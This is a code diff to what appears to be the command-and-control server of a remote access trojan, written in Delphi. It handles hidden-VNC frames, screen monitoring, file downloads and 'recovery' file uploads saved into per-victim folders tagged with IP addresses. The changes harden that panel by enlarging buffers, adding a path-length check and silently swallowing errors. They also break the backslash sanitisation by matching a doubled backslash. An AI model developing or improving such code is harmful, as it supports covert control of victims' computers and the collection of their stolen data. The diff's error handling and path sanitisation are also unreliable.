@@ -28,7 +28,7 @@ const
   HIDDEN_VNC_PLUGIN_ID        = 'HiddenVNCPlugin';
   RECOVERY_PLUGIN_ID          = 'RecoveryPlugin';
 
-  MAX_JSON_BUFFER_SIZE      = 128 * 1024 * 1024;
+  MAX_JSON_BUFFER_SIZE      = 256 * 1024 * 1024;
   PACKET_TYPE_JSON          = $01;
   PACKET_TYPE_DLL           = $02;
   PACKET_TYPE_MONITOR_FRAME = $03;
@@ -1216,18 +1216,21 @@ begin
     end;
 
     for LineText in Messages do
-      ProcessJSONMessage(aLine, LineText);
+      try ProcessJSONMessage(aLine, LineText); except end;
 
     for BP in BinaryPackets do
     begin
-      if BP.PacketType = PACKET_TYPE_MONITOR_FRAME then
-        ProcessMonitoringBinaryFrame(aLine, BP.Payload)
-      else if BP.PacketType = PACKET_TYPE_HVNC_FRAME then
-        ProcessHVNCBinaryFrame(aLine, BP.Payload)
-      else if BP.PacketType = PACKET_TYPE_RECOVERY_FILE then
-        ProcessRecoveryBinaryPacket(aLine, BP.Payload)
-      else if BP.PacketType = PACKET_TYPE_FILE_DOWNLOAD then
-        ProcessFileManagerBinaryPacket(aLine, BP.PacketType, BP.Payload);
+      try
+        if BP.PacketType = PACKET_TYPE_MONITOR_FRAME then
+          ProcessMonitoringBinaryFrame(aLine, BP.Payload)
+        else if BP.PacketType = PACKET_TYPE_HVNC_FRAME then
+          ProcessHVNCBinaryFrame(aLine, BP.Payload)
+        else if BP.PacketType = PACKET_TYPE_RECOVERY_FILE then
+          ProcessRecoveryBinaryPacket(aLine, BP.Payload)
+        else if BP.PacketType = PACKET_TYPE_FILE_DOWNLOAD then
+          ProcessFileManagerBinaryPacket(aLine, BP.PacketType, BP.Payload);
+      except
+      end;
     end;
   finally
     BinaryPackets.Free;
@@ -1303,46 +1306,54 @@ var
   FS: TFileStream;
   ClientDir: string;
 begin
-  if Length(Payload) < 8 then Exit;
-  Move(Payload[0], PathLen, 4);
-  if Length(Payload) < Integer(4 + PathLen + 4) then Exit;
-
-  RelPath := TEncoding.UTF8.GetString(Payload, 4, PathLen);
-  Move(Payload[4 + PathLen], Offset, 4);
-
-  { Basic path sanitization }
-  RelPath := RelPath.Replace('\', '/').Replace('..', '');
-  while RelPath.StartsWith('/') do Delete(RelPath, 1, 1);
-
-  if not TryGetClientInfo(aLine, Info) then Exit;
-
-  ClientDir := ExtractFilePath(ParamStr(0)) + 'Clients Folder\' + Info.ID + '\Recovery\';
-  SavePath := ClientDir + RelPath.Replace('/', '\');
-
-  ForceDirectories(ExtractFilePath(SavePath));
-
-  DataSize := Length(Payload) - (4 + Integer(PathLen) + 4);
-  if DataSize < 0 then Exit;
-
   try
-    if (Offset = 0) or (not FileExists(SavePath)) then
-      FS := TFileStream.Create(SavePath, fmCreate)
-    else
-      FS := TFileStream.Create(SavePath, fmOpenWrite or fmShareDenyNone);
+    if Length(Payload) < 8 then Exit;
+    Move(Payload[0], PathLen, 4);
+
+    // Bounds check for PathLen to prevent buffer overflow or invalid memory access
+    if (PathLen = 0) or (PathLen > 1024) then Exit;
+    if Length(Payload) < Integer(4 + PathLen + 4) then Exit;
+
+    RelPath := TEncoding.UTF8.GetString(Payload, 4, PathLen);
+    Move(Payload[4 + PathLen], Offset, 4);
+
+    { Basic path sanitization }
+    RelPath := RelPath.Replace('\\', '/').Replace('..', '');
+    while RelPath.StartsWith('/') do Delete(RelPath, 1, 1);
+
+    if not TryGetClientInfo(aLine, Info) then Exit;
+
+    ClientDir := ExtractFilePath(ParamStr(0)) + 'Clients Folder\' + Info.ID + '\Recovery\';
+    SavePath := ClientDir + RelPath.Replace('/', '\');
+
+    ForceDirectories(ExtractFilePath(SavePath));
+
+    DataSize := Length(Payload) - (4 + Integer(PathLen) + 4);
+    if DataSize < 0 then Exit;
 
     try
-      FS.Position := Offset;
-      if DataSize > 0 then
-        FS.WriteBuffer(Payload[4 + PathLen + 4], DataSize);
-    finally
-      FS.Free;
-    end;
+      if (Offset = 0) or (not FileExists(SavePath)) then
+        FS := TFileStream.Create(SavePath, fmCreate)
+      else
+        FS := TFileStream.Create(SavePath, fmOpenWrite or fmShareDenyNone);
 
-    if Offset = 0 then
-      DoLog(lcCommand, 'Recovery file transfer: ' + RelPath + ' [' + Info.IPAddress + ']');
+      try
+        FS.Position := Offset;
+        if DataSize > 0 then
+          FS.WriteBuffer(Payload[4 + PathLen + 4], DataSize);
+      finally
+        FS.Free;
+      end;
+
+      if Offset = 0 then
+        DoLog(lcCommand, 'Recovery file transfer: ' + RelPath + ' [' + Info.IPAddress + ']');
+    except
+      on E: Exception do
+        DoLog(lcError, 'Failed to save recovery file ' + RelPath + ' (Offset: ' + IntToStr(Offset) + '): ' + E.Message);
+    end;
   except
     on E: Exception do
-      DoLog(lcError, 'Failed to save recovery file ' + RelPath + ' (Offset: ' + IntToStr(Offset) + '): ' + E.Message);
+      DoLog(lcError, 'Critical error in recovery packet processing: ' + E.Message);
   end;
 end;
 
